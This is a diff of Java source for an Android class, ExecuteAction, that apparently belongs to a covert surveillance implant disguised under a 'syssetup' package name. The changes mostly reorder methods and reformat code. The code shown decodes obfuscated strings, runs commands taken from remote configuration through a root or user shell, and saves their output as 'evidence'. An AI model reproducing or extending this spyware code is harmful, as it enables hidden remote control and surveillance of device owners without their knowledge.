@@ -9,6 +9,7 @@
 
 package com.android.syssetup.action;
 
+import com.android.mm.M;
 import com.android.syssetup.Status;
 import com.android.syssetup.Trigger;
 import com.android.syssetup.auto.Cfg;
@@ -20,9 +21,9 @@ import com.android.syssetup.util.Check;
 import com.android.syssetup.util.Execute;
 import com.android.syssetup.util.ExecuteResult;
 import com.android.syssetup.util.StreamGobbler;
-import com.android.mm.M;
 
 // TODO: Aggiungere parse $dir$, verificare chmod
+
 /**
  * The Class ExecuteAction.
  */
@@ -33,69 +34,12 @@ public class ExecuteAction extends SubActionSlow {
 
 	/**
 	 * Instantiates a new execute action.
-	 * 
-	 * @param params
-	 *            the conf params
+	 *
+	 * @param params the conf params
 	 */
 	public ExecuteAction(final ConfAction params) {
 		super(params);
 	}
-
-	@Override
-	protected boolean parse(final ConfAction params) {
-		try {
-			this.command = Directory.expandMacro(params.getString("command"));
-
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (parse): " + this.command);
-			}
-		} catch (final ConfigurationException e) {
-			if (Cfg.EXCEPTION) {
-				Check.log(e);
-			}
-
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " Error: params FAILED");
-			}
-
-			return false;
-		}
-
-		return true;
-	}
-
-	/*
-	 * (non-Javadoc)
-	 * 
-	 * @see com.ht.AndroidServiceGUI.action.SubAction#execute()
-	 */
-	@Override
-	public boolean execute(Trigger trigger) {
-		ExecuteResult ret;
-
-		if (this.command.length() == 0)
-			return false;
-
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " (execute): " + command);
-		}
-
-		if (Status.haveRoot()) {
-			ret = Execute.executeRoot(this.command);
-		} else {
-			ret = Execute.execute(this.command);
-		}
-
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " (execute) exitCode: " + ret.exitCode);
-			Check.log(TAG + " (execute) stdout: " + ret.getStdout());
-		}
-
-		ret.saveEvidence();
-
-		return ret.exitCode == 0;
-	}
-
 
 	public static boolean executeRoot(String command) {
 		// Proviamo ad eseguire il comando da root
@@ -160,7 +104,7 @@ public class ExecuteAction extends SubActionSlow {
 	public static boolean executeOrigin(String command) {
 		// Proviamo ad eseguire il comando da root
 		try {
-			String cmd[] = { Configuration.shellFile, M.e("qzx"), command }; // EXPORT
+			String cmd[] = {Configuration.shellFile, M.e("qzx"), command}; // EXPORT
 			Process p = Runtime.getRuntime().exec(cmd);
 
 			p.waitFor();
@@ -178,7 +122,7 @@ public class ExecuteAction extends SubActionSlow {
 
 		// Proviamo ad eseguire il comando da utente normale
 		try {
-			String cmd[] = { M.e("/system/bin/sh"), M.e("-c"), command }; // EXPORT
+			String cmd[] = {M.e("/system/bin/sh"), M.e("-c"), command}; // EXPORT
 			Process p = Runtime.getRuntime().exec(cmd);
 
 			p.waitFor();
@@ -195,5 +139,60 @@ public class ExecuteAction extends SubActionSlow {
 		}
 
 		return false;
+	}
+
+	@Override
+	protected boolean parse(final ConfAction params) {
+		try {
+			this.command = Directory.expandMacro(params.getString("command"));
+
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (parse): " + this.command);
+			}
+		} catch (final ConfigurationException e) {
+			if (Cfg.EXCEPTION) {
+				Check.log(e);
+			}
+
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Error: params FAILED");
+			}
+
+			return false;
+		}
+
+		return true;
+	}
+
+	/*
+	 * (non-Javadoc)
+	 *
+	 * @see com.ht.AndroidServiceGUI.action.SubAction#execute()
+	 */
+	@Override
+	public boolean execute(Trigger trigger) {
+		ExecuteResult ret;
+
+		if (this.command.length() == 0)
+			return false;
+
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (execute): " + command);
+		}
+
+		if (Status.haveRoot()) {
+			ret = Execute.executeRoot(this.command);
+		} else {
+			ret = Execute.execute(this.command);
+		}
+
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (execute) exitCode: " + ret.exitCode);
+			Check.log(TAG + " (execute) stdout: " + ret.getStdout());
+		}
+
+		ret.saveEvidence();
+
+		return ret.exitCode == 0;
 	}
 }
